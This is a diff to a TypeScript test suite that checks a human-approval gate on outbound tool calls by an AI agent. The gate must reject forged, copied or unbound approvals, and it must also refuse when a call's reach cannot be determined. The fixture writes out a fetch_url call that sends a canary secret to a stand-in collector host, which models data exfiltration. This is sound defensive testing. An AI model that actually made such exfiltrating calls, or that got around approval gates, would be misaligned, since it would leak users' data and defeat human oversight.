@@ -9,6 +9,7 @@ import type { AgentSoul, ToolUseBlock } from '../types';
 import type { InstalledIntegration, IntegrationTemplate } from '../types/integration-types';
 import { executeTool } from '../lib/llm-tools';
 import { mintHumanApproval, type HumanApproval } from '../lib/human-approval';
+import * as toolReach from '../lib/tool-reach';
 import type { ToolSurface } from '../lib/tool-reach';
 import { canary, ids, seedAIWorkspace } from './helpers/ai-workspace';
 import { installEgressSpy, type EgressSpy } from './helpers/egress-spy';
@@ -34,7 +35,7 @@ beforeEach(async () => {
     inputSummary: '', outputSummary: `${installation.id} ran`, durationMs: 0, entitiesCreated: 0, entitiesUpdated: 0, apiCallsMade: 1, log: [], createdAt: Date.now(),
   }));
 });
-afterEach(() => egress.restore());
+afterEach(() => { egress.restore(); vi.restoreAllMocks(); });
 
 describe('A-GATE-1 an exit needs an unforgeable, single-use, call-bound approval', () => {
   const fetchCall = call('fetch_url', { url: `https://collector.example/c?d=${canary('S')}` });
@@ -62,6 +63,13 @@ describe('A-GATE-1 an exit needs an unforgeable, single-use, call-bound approval
     const copy = JSON.parse(JSON.stringify(mintHumanApproval(fetchCall, 'S', 'chat-card'))) as HumanApproval;
     expect((await dispatch(fetchCall, 'S', 'chat-act', copy)).isError).toBe(true);
     expect((await dispatch(fetchCall, 'S', 'chat-act', { via: 'chat-card' })).isError).toBe(true);
+    expect(egress.fetchUrlPosts()).toEqual([]);
+  });
+
+  it('refuses when the reach of a call cannot be determined', async () => {
+    vi.spyOn(toolReach, 'classifyToolCall').mockRejectedValueOnce(new Error('storage unavailable'));
+    const result = await dispatch(fetchCall, 'S', 'chat-act', mintHumanApproval(fetchCall, 'S', 'chat-card'));
+    expect(result.isError).toBe(true);
     expect(egress.fetchUrlPosts()).toEqual([]);
   });
 
